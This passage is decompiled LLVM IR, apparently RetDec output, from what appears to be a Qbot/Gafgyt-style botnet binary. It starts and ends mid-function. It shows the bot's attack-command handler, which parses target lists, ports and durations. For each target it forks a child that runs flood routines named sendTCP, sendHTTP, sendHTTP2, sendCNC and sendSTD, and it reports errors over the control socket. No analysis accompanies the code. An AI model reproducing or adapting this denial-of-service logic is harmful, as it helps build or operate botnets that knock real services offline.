  %v1_10eb4 = inttoptr i32 %v1_10eb0 to i32*
  %v2_10eb4 = load i32, i32* %v1_10eb4, align 4
  store i32 %v2_10eb4, i32* @r0, align 4
  %v1_10ebc = call i32 @atol(i32 %v2_10eb4)
  %v7_10ec4 = icmp eq i32 %v1_10ebc, -1
  br i1 %v7_10ec4, label %dec_label_pc_10f44, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10eac
  %v2_10ed4 = load i32, i32* %v1_10eb4, align 4
  store i32 %v2_10ed4, i32* @r0, align 4
  %v1_10edc = call i32 @atol(i32 %v2_10ed4)
  %v8_10ee8 = icmp sgt i32 %v1_10edc, 32
  br i1 %v8_10ee8, label %dec_label_pc_10f44, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ecc
  %v7_10ef4 = icmp slt i32 %arg1, 7
  br i1 %v7_10ef4, label %dec_label_pc_10f18, label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10eec
  %v1_10efc = add i32 %tmp, 24
  %v1_10f00 = inttoptr i32 %v1_10efc to i32*
  %v2_10f00 = load i32, i32* %v1_10f00, align 4
  store i32 %v2_10f00, i32* @r0, align 4
  %v1_10f08 = call i32 @atol(i32 %v2_10f00)
  %v1_10f10 = icmp slt i32 %v1_10f08, 0
  br i1 %v1_10f10, label %dec_label_pc_10f44, label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10ef8, %dec_label_pc_10eec
  %v7_10f1c = icmp eq i32 %arg1, 8
  br i1 %v7_10f1c, label %dec_label_pc_10f24, label %dec_label_pc_10f5c

dec_label_pc_10f24:                               ; preds = %dec_label_pc_10f18
  %v1_10f28 = add i32 %tmp, 28
  %v1_10f2c = inttoptr i32 %v1_10f28 to i32*
  %v2_10f2c = load i32, i32* %v1_10f2c, align 4
  store i32 %v2_10f2c, i32* @r0, align 4
  %v1_10f34 = call i32 @atol(i32 %v2_10f2c)
  %v5_10f40 = icmp sgt i32 %v1_10f34, 0
  br i1 %v5_10f40, label %dec_label_pc_10f5c, label %dec_label_pc_10f44

dec_label_pc_10f44:                               ; preds = %dec_label_pc_10f24, %dec_label_pc_10ef8, %dec_label_pc_10ecc, %dec_label_pc_10eac, %dec_label_pc_10e8c, %dec_label_pc_10e6c, %dec_label_pc_10e60
  %v2_10f48 = load i32, i32* @global_var_2a530.50, align 4
  %v3_10f54 = call i32 @sockprintf(i32 %v2_10f48, i32 ptrtoint ([186 x i8]* @global_var_201a4.756 to i32))
  br label %dec_label_pc_11940

dec_label_pc_10f5c:                               ; preds = %dec_label_pc_10f18, %dec_label_pc_10f24
  %v1_10f60 = add i32 %tmp, 4
  %v1_10f64 = inttoptr i32 %v1_10f60 to i32*
  %v2_10f64 = load i32, i32* %v1_10f64, align 4
  %v2_10f74 = load i32, i32* %v1_10e94, align 4
  store i32 %v2_10f74, i32* @r0, align 4
  %v1_10f7c = call i32 @atol(i32 %v2_10f74)
  %v2_10f90 = load i32, i32* %v1_10e74, align 4
  store i32 %v2_10f90, i32* @r0, align 4
  %v1_10f98 = call i32 @atol(i32 %v2_10f90)
  %v2_10fac = load i32, i32* %v1_10eb4, align 4
  store i32 %v2_10fac, i32* @r0, align 4
  %v1_10fb4 = call i32 @atol(i32 %v2_10fac)
  %v1_10fc4 = add i32 %tmp, 20
  %v1_10fc8 = inttoptr i32 %v1_10fc4 to i32*
  %v2_10fc8 = load i32, i32* %v1_10fc8, align 4
  br i1 %v7_10f1c, label %dec_label_pc_10fdc, label %dec_label_pc_10ff8

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_10f5c
  %v1_10fe0 = add i32 %tmp, 28
  %v1_10fe4 = inttoptr i32 %v1_10fe0 to i32*
  %v2_10fe4 = load i32, i32* %v1_10fe4, align 4
  store i32 %v2_10fe4, i32* @r0, align 4
  %v1_10fec = call i32 @atol(i32 %v2_10fe4)
  br label %dec_label_pc_11000

dec_label_pc_10ff8:                               ; preds = %dec_label_pc_10f5c
  br label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %dec_label_pc_10fdc, %dec_label_pc_10ff8
  %storemerge7 = phi i32 [ 10, %dec_label_pc_10ff8 ], [ %v1_10fec, %dec_label_pc_10fdc ]
  br i1 %v7_10ef4, label %dec_label_pc_11030, label %dec_label_pc_11014

dec_label_pc_11014:                               ; preds = %dec_label_pc_11000
  %v1_11018 = add i32 %tmp, 24
  %v1_1101c = inttoptr i32 %v1_11018 to i32*
  %v2_1101c = load i32, i32* %v1_1101c, align 4
  store i32 %v2_1101c, i32* @r0, align 4
  %v1_11024 = call i32 @atol(i32 %v2_1101c)
  br label %dec_label_pc_11038

dec_label_pc_11030:                               ; preds = %dec_label_pc_11000
  br label %dec_label_pc_11038

dec_label_pc_11038:                               ; preds = %dec_label_pc_11014, %dec_label_pc_11030
  %storemerge6 = phi i32 [ 0, %dec_label_pc_11030 ], [ %v1_11024, %dec_label_pc_11014 ]
  store i32 %v2_10f64, i32* @r0, align 4
  %v2_1104c = call i32 @__GI_strchr(i32 %v2_10f64, i32 44)
  store i32 %v2_1104c, i32* @r0, align 4
  %v2_11054 = icmp eq i32 %v2_1104c, 0
  br i1 %v2_11054, label %dec_label_pc_110e0, label %dec_label_pc_1105c

dec_label_pc_1105c:                               ; preds = %dec_label_pc_11038
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_11068 = call i32 @__GI_strtok(i32 %v2_10f64, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_11068, i32* @r0, align 4
  %v2_110d431 = icmp eq i32 %v2_11068, 0
  br i1 %v2_110d431, label %dec_label_pc_11124, label %dec_label_pc_11078

dec_label_pc_11078:                               ; preds = %dec_label_pc_1105c, %dec_label_pc_110bc
  %storemerge1932 = phi i32 [ %v2_110c4, %dec_label_pc_110bc ], [ %v2_11068, %dec_label_pc_1105c ]
  %v0_11078 = call i32 @listFork()
  %v2_11080 = icmp eq i32 %v0_11078, 0
  br i1 %v2_11080, label %dec_label_pc_11088, label %dec_label_pc_110bc

dec_label_pc_11088:                               ; preds = %dec_label_pc_11078
  %v7_110b0 = call i32 @sendTCP(i32 %storemerge1932, i32 %v1_10f7c, i32 %v1_10f98, i32 %v1_10fb4, i32 %v2_10fc8, i32 %storemerge6, i32 %storemerge7)
  %v1_110b8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_110bc

dec_label_pc_110bc:                               ; preds = %dec_label_pc_11078, %dec_label_pc_11088
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_110c4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_110c4, i32* @r0, align 4
  %v2_110d4 = icmp eq i32 %v2_110c4, 0
  br i1 %v2_110d4, label %dec_label_pc_11124, label %dec_label_pc_11078

dec_label_pc_110e0:                               ; preds = %dec_label_pc_11038
  %v0_110e0 = call i32 @listFork()
  %v2_110e8 = icmp eq i32 %v0_110e0, 0
  br i1 %v2_110e8, label %dec_label_pc_110f0, label %dec_label_pc_11124

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110e0
  %v7_11118 = call i32 @sendTCP(i32 %v2_10f64, i32 %v1_10f7c, i32 %v1_10f98, i32 %v1_10fb4, i32 %v2_10fc8, i32 %storemerge6, i32 %storemerge7)
  %v1_11120 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %dec_label_pc_110bc, %dec_label_pc_1105c, %dec_label_pc_110e0, %dec_label_pc_10e40, %dec_label_pc_110f0
  %v2_11128 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_20260.758 to i32), i32* @r1, align 4
  %v3_11134 = inttoptr i32 %v2_11128 to i8*
  %v4_11134 = call i32 @__GI_strcoll(i8* %v3_11134, i32 ptrtoint ([5 x i8]* @global_var_20260.758 to i32))
  %v2_1113c = icmp eq i32 %v4_11134, 0
  br i1 %v2_1113c, label %dec_label_pc_11144, label %dec_label_pc_1131c

dec_label_pc_11144:                               ; preds = %dec_label_pc_11124
  %v7_1114c = icmp slt i32 %arg1, 6
  br i1 %v7_1114c, label %dec_label_pc_11940, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_11144
  %v1_11154 = add i32 %tmp, 4
  %v1_11158 = inttoptr i32 %v1_11154 to i32*
  %v2_11158 = load i32, i32* %v1_11158, align 4
  store i32 %v2_11158, i32* @r0, align 4
  %v2_11164 = call i32 @__GI_strchr(i32 %v2_11158, i32 44)
  store i32 %v2_11164, i32* @r0, align 4
  %v2_1116c = icmp eq i32 %v2_11164, 0
  br i1 %v2_1116c, label %dec_label_pc_1126c, label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %dec_label_pc_11150
  %v2_1117c = load i32, i32* %v1_11158, align 4
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_11188 = call i32 @__GI_strtok(i32 %v2_1117c, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_11188, i32* @r0, align 4
  %v2_1126029 = icmp eq i32 %v2_11188, 0
  br i1 %v2_1126029, label %dec_label_pc_1131c, label %dec_label_pc_11198.lr.ph

dec_label_pc_11198.lr.ph:                         ; preds = %dec_label_pc_11174
  %v1_111b8 = add i32 %tmp, 8
  %v1_111bc = inttoptr i32 %v1_111b8 to i32*
  %v1_111c8 = add i32 %tmp, 12
  %v1_111cc = inttoptr i32 %v1_111c8 to i32*
  %v1_111e8 = add i32 %tmp, 16
  %v1_111ec = inttoptr i32 %v1_111e8 to i32*
  %v1_111f8 = add i32 %tmp, 20
  %v1_111fc = inttoptr i32 %v1_111f8 to i32*
  %v1_11210 = add i32 %tmp, 24
  %v1_11214 = inttoptr i32 %v1_11210 to i32*
  br label %dec_label_pc_11198

dec_label_pc_11198:                               ; preds = %dec_label_pc_11198.lr.ph, %dec_label_pc_11248
  %v0_11198 = call i32 @listFork()
  %v2_111a0 = icmp eq i32 %v0_11198, 0
  br i1 %v2_111a0, label %dec_label_pc_111a8, label %dec_label_pc_11248

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11198
  %v2_111b0 = load i32, i32* %v1_11158, align 4
  store i32 %v2_111b0, i32* @r5, align 4
  %v2_111bc = load i32, i32* %v1_111bc, align 4
  store i32 %v2_111bc, i32* @r6, align 4
  %v2_111cc = load i32, i32* %v1_111cc, align 4
  store i32 %v2_111cc, i32* @r0, align 4
  %v1_111d4 = call i32 @atol(i32 %v2_111cc)
  %v3_111e0 = urem i32 %v1_111d4, 65536
  store i32 %v3_111e0, i32* @r7, align 4
  %v2_111ec = load i32, i32* %v1_111ec, align 4
  store i32 %v2_111ec, i32* @r8, align 4
  %v2_111fc = load i32, i32* %v1_111fc, align 4
  store i32 %v2_111fc, i32* @r0, align 4
  %v1_11204 = call i32 @atol(i32 %v2_111fc)
  store i32 %v1_11204, i32* @r4, align 4
  %v2_11214 = load i32, i32* %v1_11214, align 4
  store i32 %v2_11214, i32* @r0, align 4
  %v1_1121c = call i32 @atol(i32 %v2_11214)
  %v0_11224 = load i32, i32* @r4, align 4
  %v0_1122c = load i32, i32* @r5, align 4
  %v0_11230 = load i32, i32* @r6, align 4
  %v0_11234 = load i32, i32* @r7, align 4
  %v0_11238 = load i32, i32* @r8, align 4
  %v6_1123c = trunc i32 %v0_11234 to i16
  %v7_1123c = call i32 @sendHTTP(i32 %v0_1122c, i32 %v0_11230, i16 %v6_1123c, i32 %v0_11238, i32 %v0_11224, i32 %v1_1121c)
  %v1_11244 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11248

dec_label_pc_11248:                               ; preds = %dec_label_pc_11198, %dec_label_pc_111a8
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_11250 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_11250, i32* @r0, align 4
  %v2_11260 = icmp eq i32 %v2_11250, 0
  br i1 %v2_11260, label %dec_label_pc_1131c, label %dec_label_pc_11198

dec_label_pc_1126c:                               ; preds = %dec_label_pc_11150
  %v0_1126c = call i32 @listFork()
  %v2_11274 = icmp eq i32 %v0_1126c, 0
  br i1 %v2_11274, label %dec_label_pc_1127c, label %dec_label_pc_11940

dec_label_pc_1127c:                               ; preds = %dec_label_pc_1126c
  %v2_11284 = load i32, i32* %v1_11158, align 4
  store i32 %v2_11284, i32* @r5, align 4
  %v1_1128c = add i32 %tmp, 8
  %v1_11290 = inttoptr i32 %v1_1128c to i32*
  %v2_11290 = load i32, i32* %v1_11290, align 4
  store i32 %v2_11290, i32* @r6, align 4
  %v1_1129c = add i32 %tmp, 12
  %v1_112a0 = inttoptr i32 %v1_1129c to i32*
  %v2_112a0 = load i32, i32* %v1_112a0, align 4
  store i32 %v2_112a0, i32* @r0, align 4
  %v1_112a8 = call i32 @atol(i32 %v2_112a0)
  %v3_112b4 = urem i32 %v1_112a8, 65536
  store i32 %v3_112b4, i32* @r7, align 4
  %v1_112bc = add i32 %tmp, 16
  %v1_112c0 = inttoptr i32 %v1_112bc to i32*
  %v2_112c0 = load i32, i32* %v1_112c0, align 4
  store i32 %v2_112c0, i32* @r8, align 4
  %v1_112cc = add i32 %tmp, 20
  %v1_112d0 = inttoptr i32 %v1_112cc to i32*
  %v2_112d0 = load i32, i32* %v1_112d0, align 4
  store i32 %v2_112d0, i32* @r0, align 4
  %v1_112d8 = call i32 @atol(i32 %v2_112d0)
  store i32 %v1_112d8, i32* @r4, align 4
  %v1_112e4 = add i32 %tmp, 24
  %v1_112e8 = inttoptr i32 %v1_112e4 to i32*
  %v2_112e8 = load i32, i32* %v1_112e8, align 4
  store i32 %v2_112e8, i32* @r0, align 4
  %v1_112f0 = call i32 @atol(i32 %v2_112e8)
  %v0_112f8 = load i32, i32* @r4, align 4
  %v0_11300 = load i32, i32* @r5, align 4
  %v0_11304 = load i32, i32* @r6, align 4
  %v0_11308 = load i32, i32* @r7, align 4
  %v0_1130c = load i32, i32* @r8, align 4
  %v6_11310 = trunc i32 %v0_11308 to i16
  %v7_11310 = call i32 @sendHTTP(i32 %v0_11300, i32 %v0_11304, i16 %v6_11310, i32 %v0_1130c, i32 %v0_112f8, i32 %v1_112f0)
  %v1_11318 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1131c

dec_label_pc_1131c:                               ; preds = %dec_label_pc_11248, %dec_label_pc_11174, %dec_label_pc_11124, %dec_label_pc_1127c
  %v2_11320 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_20268.760 to i32), i32* @r1, align 4
  %v3_1132c = inttoptr i32 %v2_11320 to i8*
  %v4_1132c = call i32 @__GI_strcoll(i8* %v3_1132c, i32 ptrtoint ([10 x i8]* @global_var_20268.760 to i32))
  %v2_11334 = icmp eq i32 %v4_1132c, 0
  br i1 %v2_11334, label %dec_label_pc_1133c, label %dec_label_pc_11440

dec_label_pc_1133c:                               ; preds = %dec_label_pc_1131c
  %v7_11344 = icmp slt i32 %arg1, 6
  br i1 %v7_11344, label %dec_label_pc_11940, label %dec_label_pc_11348

dec_label_pc_11348:                               ; preds = %dec_label_pc_1133c
  %v1_1134c = add i32 %tmp, 12
  %v1_11350 = inttoptr i32 %v1_1134c to i32*
  %v2_11350 = load i32, i32* %v1_11350, align 4
  store i32 %v2_11350, i32* @r0, align 4
  %v1_11358 = call i32 @atol(i32 %v2_11350)
  %tmp95 = icmp slt i32 %v1_11358, 1
  br i1 %tmp95, label %dec_label_pc_11940, label %dec_label_pc_11368

dec_label_pc_11368:                               ; preds = %dec_label_pc_11348
  %v1_1136c = add i32 %tmp, 20
  %v1_11370 = inttoptr i32 %v1_1136c to i32*
  %v2_11370 = load i32, i32* %v1_11370, align 4
  store i32 %v2_11370, i32* @r0, align 4
  %v1_11378 = call i32 @atol(i32 %v2_11370)
  store i32 %v1_11378, i32* @r0, align 4
  %v5_11384 = icmp sgt i32 %v1_11378, 0
  br i1 %v5_11384, label %dec_label_pc_1138c, label %dec_label_pc_11940

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11368
  %v0_1138c = call i32 @listFork()
  %v2_11394 = icmp eq i32 %v0_1138c, 0
  br i1 %v2_11394, label %dec_label_pc_1139c, label %dec_label_pc_11940

dec_label_pc_1139c:                               ; preds = %dec_label_pc_1138c
  %v1_113a0 = add i32 %tmp, 4
  %v1_113a4 = inttoptr i32 %v1_113a0 to i32*
  %v2_113a4 = load i32, i32* %v1_113a4, align 4
  store i32 %v2_113a4, i32* @r5, align 4
  %v1_113b0 = add i32 %tmp, 8
  %v1_113b4 = inttoptr i32 %v1_113b0 to i32*
  %v2_113b4 = load i32, i32* %v1_113b4, align 4
  store i32 %v2_113b4, i32* @r6, align 4
  %v2_113c4 = load i32, i32* %v1_11350, align 4
  store i32 %v2_113c4, i32* @r0, align 4
  %v1_113cc = call i32 @atol(i32 %v2_113c4)
  %v3_113d8 = urem i32 %v1_113cc, 65536
  store i32 %v3_113d8, i32* @r7, align 4
  %v1_113e0 = add i32 %tmp, 16
  %v1_113e4 = inttoptr i32 %v1_113e0 to i32*
  %v2_113e4 = load i32, i32* %v1_113e4, align 4
  store i32 %v2_113e4, i32* @r8, align 4
  %v2_113f4 = load i32, i32* %v1_11370, align 4
  store i32 %v2_113f4, i32* @r0, align 4
  %v1_113fc = call i32 @atol(i32 %v2_113f4)
  store i32 %v1_113fc, i32* @r4, align 4
  %v1_11408 = add i32 %tmp, 24
  %v1_1140c = inttoptr i32 %v1_11408 to i32*
  %v2_1140c = load i32, i32* %v1_1140c, align 4
  store i32 %v2_1140c, i32* @r0, align 4
  %v1_11414 = call i32 @atol(i32 %v2_1140c)
  %v0_1141c = load i32, i32* @r4, align 4
  %v0_11424 = load i32, i32* @r5, align 4
  %v0_11428 = load i32, i32* @r6, align 4
  %v0_1142c = load i32, i32* @r7, align 4
  %v0_11430 = load i32, i32* @r8, align 4
  %v6_11434 = trunc i32 %v0_1142c to i16
  %v7_11434 = call i32 @sendHTTP2(i32 %v0_11424, i32 %v0_11428, i16 %v6_11434, i32 %v0_11430, i32 %v0_1141c, i32 %v1_11414)
  %v1_1143c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_1131c, %dec_label_pc_1139c
  %v2_11444 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_20274.762 to i32), i32* @r1, align 4
  %v3_11450 = inttoptr i32 %v2_11444 to i8*
  %v4_11450 = call i32 @__GI_strcoll(i8* %v3_11450, i32 ptrtoint ([4 x i8]* @global_var_20274.762 to i32))
  %v2_11458 = icmp eq i32 %v4_11450, 0
  br i1 %v2_11458, label %dec_label_pc_11460, label %dec_label_pc_115c8

dec_label_pc_11460:                               ; preds = %dec_label_pc_11440
  %v7_11468 = icmp slt i32 %arg1, 4
  br i1 %v7_11468, label %dec_label_pc_114ac, label %dec_label_pc_1146c

dec_label_pc_1146c:                               ; preds = %dec_label_pc_11460
  %v1_11470 = add i32 %tmp, 8
  %v1_11474 = inttoptr i32 %v1_11470 to i32*
  %v2_11474 = load i32, i32* %v1_11474, align 4
  store i32 %v2_11474, i32* @r0, align 4
  %v1_1147c = call i32 @atol(i32 %v2_11474)
  %tmp96 = icmp slt i32 %v1_1147c, 1
  br i1 %tmp96, label %dec_label_pc_114ac, label %dec_label_pc_1148c

dec_label_pc_1148c:                               ; preds = %dec_label_pc_1146c
  %v1_11490 = add i32 %tmp, 12
  %v1_11494 = inttoptr i32 %v1_11490 to i32*
  %v2_11494 = load i32, i32* %v1_11494, align 4
  store i32 %v2_11494, i32* @r0, align 4
  %v1_1149c = call i32 @atol(i32 %v2_11494)
  %v5_114a8 = icmp sgt i32 %v1_1149c, 0
  br i1 %v5_114a8, label %dec_label_pc_114c4, label %dec_label_pc_114ac

dec_label_pc_114ac:                               ; preds = %dec_label_pc_1148c, %dec_label_pc_1146c, %dec_label_pc_11460
  %v2_114b0 = load i32, i32* @global_var_2a530.50, align 4
  %v3_114bc = call i32 @sockprintf(i32 %v2_114b0, i32 ptrtoint ([27 x i8]* @global_var_20278.764 to i32))
  br label %dec_label_pc_11940

dec_label_pc_114c4:                               ; preds = %dec_label_pc_1148c
  %v1_114c8 = add i32 %tmp, 4
  %v1_114cc = inttoptr i32 %v1_114c8 to i32*
  %v2_114cc = load i32, i32* %v1_114cc, align 4
  %v2_114dc = load i32, i32* %v1_11474, align 4
  store i32 %v2_114dc, i32* @r0, align 4
  %v1_114e4 = call i32 @atol(i32 %v2_114dc)
  %v2_114f8 = load i32, i32* %v1_11494, align 4
  store i32 %v2_114f8, i32* @r0, align 4
  %v1_11500 = call i32 @atol(i32 %v2_114f8)
  store i32 %v2_114cc, i32* @r0, align 4
  %v2_11518 = call i32 @__GI_strchr(i32 %v2_114cc, i32 44)
  store i32 %v2_11518, i32* @r0, align 4
  %v2_11520 = icmp eq i32 %v2_11518, 0
  br i1 %v2_11520, label %dec_label_pc_115a0, label %dec_label_pc_11528

dec_label_pc_11528:                               ; preds = %dec_label_pc_114c4
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_11534 = call i32 @__GI_strtok(i32 %v2_114cc, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_11534, i32* @r0, align 4
  %v2_1159426 = icmp eq i32 %v2_11534, 0
  br i1 %v2_1159426, label %dec_label_pc_115c8, label %dec_label_pc_11544

dec_label_pc_11544:                               ; preds = %dec_label_pc_11528, %dec_label_pc_1157c
  %storemerge1527 = phi i32 [ %v2_11584, %dec_label_pc_1157c ], [ %v2_11534, %dec_label_pc_11528 ]
  %v0_11544 = call i32 @listFork()
  %v2_1154c = icmp eq i32 %v0_11544, 0
  br i1 %v2_1154c, label %dec_label_pc_11554, label %dec_label_pc_1157c

dec_label_pc_11554:                               ; preds = %dec_label_pc_11544
  %v4_11560 = call i32 @sendCNC(i32 %storemerge1527, i32 %v1_114e4, i32 %v1_11500, i32 0)
  %v2_11568 = load i32, i32* @global_var_2a530.50, align 4
  %v1_11570 = call i32 @__GI_close(i32 %v2_11568)
  %v1_11578 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_11544, %dec_label_pc_11554
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_11584 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_11584, i32* @r0, align 4
  %v2_11594 = icmp eq i32 %v2_11584, 0
  br i1 %v2_11594, label %dec_label_pc_115c8, label %dec_label_pc_11544

dec_label_pc_115a0:                               ; preds = %dec_label_pc_114c4
  %v0_115a0 = call i32 @listFork()
  %v2_115a8 = icmp eq i32 %v0_115a0, 0
  br i1 %v2_115a8, label %dec_label_pc_115b0, label %dec_label_pc_11940

dec_label_pc_115b0:                               ; preds = %dec_label_pc_115a0
  %v4_115bc = call i32 @sendCNC(i32 %v2_114cc, i32 %v1_114e4, i32 %v1_11500, i32 0)
  %v1_115c4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_1157c, %dec_label_pc_11528, %dec_label_pc_11440, %dec_label_pc_115b0
  %v2_115cc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_20294.766 to i32), i32* @r1, align 4
  %v3_115d8 = inttoptr i32 %v2_115cc to i8*
  %v4_115d8 = call i32 @__GI_strcoll(i8* %v3_115d8, i32 ptrtoint ([4 x i8]* @global_var_20294.766 to i32))
  %v2_115e0 = icmp eq i32 %v4_115d8, 0
  br i1 %v2_115e0, label %dec_label_pc_115e8, label %dec_label_pc_11740

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115c8
  %v7_115f0 = icmp slt i32 %arg1, 4
  br i1 %v7_115f0, label %dec_label_pc_11634, label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115e8
  %v1_115f8 = add i32 %tmp, 8
  %v1_115fc = inttoptr i32 %v1_115f8 to i32*
  %v2_115fc = load i32, i32* %v1_115fc, align 4
  store i32 %v2_115fc, i32* @r0, align 4
  %v1_11604 = call i32 @atol(i32 %v2_115fc)
  %tmp97 = icmp slt i32 %v1_11604, 1
  br i1 %tmp97, label %dec_label_pc_11634, label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_115f4
  %v1_11618 = add i32 %tmp, 12
  %v1_1161c = inttoptr i32 %v1_11618 to i32*
  %v2_1161c = load i32, i32* %v1_1161c, align 4
  store i32 %v2_1161c, i32* @r0, align 4
  %v1_11624 = call i32 @atol(i32 %v2_1161c)
  %v5_11630 = icmp sgt i32 %v1_11624, 0
  br i1 %v5_11630, label %dec_label_pc_1164c, label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %dec_label_pc_11614, %dec_label_pc_115f4, %dec_label_pc_115e8
  %v2_11638 = load i32, i32* @global_var_2a530.50, align 4
  %v3_11644 = call i32 @sockprintf(i32 %v2_11638, i32 ptrtoint ([27 x i8]* @global_var_20298.768 to i32))
  br label %dec_label_pc_11940

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11614
  %v1_11650 = add i32 %tmp, 4
  %v1_11654 = inttoptr i32 %v1_11650 to i32*
  %v2_11654 = load i32, i32* %v1_11654, align 4
  %v2_11664 = load i32, i32* %v1_115fc, align 4
  store i32 %v2_11664, i32* @r0, align 4
  %v1_1166c = call i32 @atol(i32 %v2_11664)
  %v2_11680 = load i32, i32* %v1_1161c, align 4
  store i32 %v2_11680, i32* @r0, align 4
  %v1_11688 = call i32 @atol(i32 %v2_11680)
  store i32 %v2_11654, i32* @r0, align 4
  %v2_116a0 = call i32 @__GI_strchr(i32 %v2_11654, i32 44)
  store i32 %v2_116a0, i32* @r0, align 4
  %v2_116a8 = icmp eq i32 %v2_116a0, 0
  br i1 %v2_116a8, label %dec_label_pc_11718, label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_1164c
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_116bc = call i32 @__GI_strtok(i32 %v2_11654, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_116bc, i32* @r0, align 4
  %v2_1170c23 = icmp eq i32 %v2_116bc, 0
  br i1 %v2_1170c23, label %dec_label_pc_11740, label %dec_label_pc_116cc

dec_label_pc_116cc:                               ; preds = %dec_label_pc_116b0, %dec_label_pc_116f4
  %storemerge1324 = phi i32 [ %v2_116fc, %dec_label_pc_116f4 ], [ %v2_116bc, %dec_label_pc_116b0 ]
  %v0_116cc = call i32 @listFork()
  %v2_116d4 = icmp eq i32 %v0_116cc, 0
  br i1 %v2_116d4, label %dec_label_pc_116dc, label %dec_label_pc_116f4

dec_label_pc_116dc:                               ; preds = %dec_label_pc_116cc
  %v4_116e8 = call i32 @sendSTD(i32 %storemerge1324, i32 %v1_1166c, i32 %v1_11688, i32 0)
  %v1_116f0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_116f4

dec_label_pc_116f4:                               ; preds = %dec_label_pc_116cc, %dec_label_pc_116dc
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_116fc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_116fc, i32* @r0, align 4
  %v2_1170c = icmp eq i32 %v2_116fc, 0
  br i1 %v2_1170c, label %dec_label_pc_11740, label %dec_label_pc_116cc

dec_label_pc_11718:                               ; preds = %dec_label_pc_1164c
  %v0_11718 = call i32 @listFork()
  %v2_11720 = icmp eq i32 %v0_11718, 0
  br i1 %v2_11720, label %dec_label_pc_11728, label %dec_label_pc_11940

dec_label_pc_11728:                               ; preds = %dec_label_pc_11718
  %v4_11734 = call i32 @sendSTD(i32 %v2_11654, i32 %v1_1166c, i32 %v1_11688, i32 0)
  %v1_1173c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11740

dec_label_pc_11740:                               ; preds = %dec_label_pc_116f4, %dec_label_pc_116b0, %dec_label_pc_115c8, %dec_label_pc_11728
  %v2_11744 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_202b4.770 to i32), i32* @r1, align 4
  %v3_11750 = inttoptr i32 %v2_11744 to i8*
  %v4_11750 = call i32 @__GI_strcoll(i8* %v3_11750, i32 ptrtoint ([9 x i8]* @global_var_202b4.770 to i32))
  store i32 %v4_11750, i32* @r0, align 4
  %v2_11758 = icmp eq i32 %v4_11750, 0
  br i1 %v2_11758, label %dec_label_pc_11760, label %dec_label_pc_11918

dec_label_pc_11760:                               ; preds = %dec_label_pc_11740
  br label %dec_label_pc_11888

dec_label_pc_117f8:                               ; preds = %dec_label_pc_11888, %dec_label_pc_118bc
  %v3_117fc = mul i32 %storemerge11, 4
  %v2_11808 = load i32, i32* @global_var_30798.71, align 4
  %v2_1180c = add i32 %v2_11808, %v3_117fc
  %v1_11810 = inttoptr i32 %v2_1180c to i32*
  %v2_11810 = load i32, i32* %v1_11810, align 4
  %v2_11814 = icmp eq i32 %v2_11810, 0
  br i1 %v2_11814, label %dec_label_pc_1187c, label %dec_label_pc_1181c

dec_label_pc_1181c:                               ; preds = %dec_label_pc_117f8
